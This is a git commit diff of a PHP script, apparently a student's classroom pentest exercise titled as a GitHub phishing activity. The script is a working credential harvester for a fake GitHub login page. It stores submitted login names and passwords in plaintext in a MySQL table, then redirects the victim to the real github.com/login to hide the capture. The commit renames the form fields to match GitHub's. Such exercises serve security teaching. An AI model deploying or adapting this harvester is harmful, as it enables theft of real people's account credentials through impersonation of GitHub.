520c96d3f1c572e4636a1af8ee38809e84b4ef65
JOSE ROBERTO LISBOA DA SILVA FILHO <0031432412016@lti.fatecso.edu.br>
2025-04-30 13:48:54 -0300

    Atividade Phishing Github Feita

--- Atv_Phishing_Github/Login.php
+++ Atv_Phishing_Github/Login.php
@@ -1,11 +1,12 @@
 <?php
 
-
+// Alterei o nome dos inputs de email para login e de pass para password
+// Alterei o Location para redirecion para github.com/login
 var_dump(value: $_SERVER["REQUEST_METHOD"]);
 print_r(value: $_POST);
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    if ($_POST["email"] != "" AND $_POST["pass"] != "") {
+    if ($_POST["login"] != "" AND $_POST["password"] != "") {
 
 
         $conn = new PDO(dsn: "mysql:host=localhost;dbname=pentestweb", username: 'root', password: '');
@@ -13,9 +14,9 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $conn->setAttribute(attribute: PDO::ATTR_ERRMODE, value: PDO::ERRMODE_EXCEPTION);
         echo "Connected sucessfully";
         $stmt = $conn->prepare(query: ' INSERT INTO tb_usuario(LOGIN_US,SENHA_US) VALUES(? , ?) ');
-        $stmt->execute(params: array ($_POST["email"], $_POST["pass"]));
+        $stmt->execute(params: array ($_POST["login"], $_POST["password"]));
         // echo "feito";
-        header(header: "Location:https://github.com");
+        header(header: "Location:https://github.com/login");
     }else{
         header(header: "Location:/");
     }
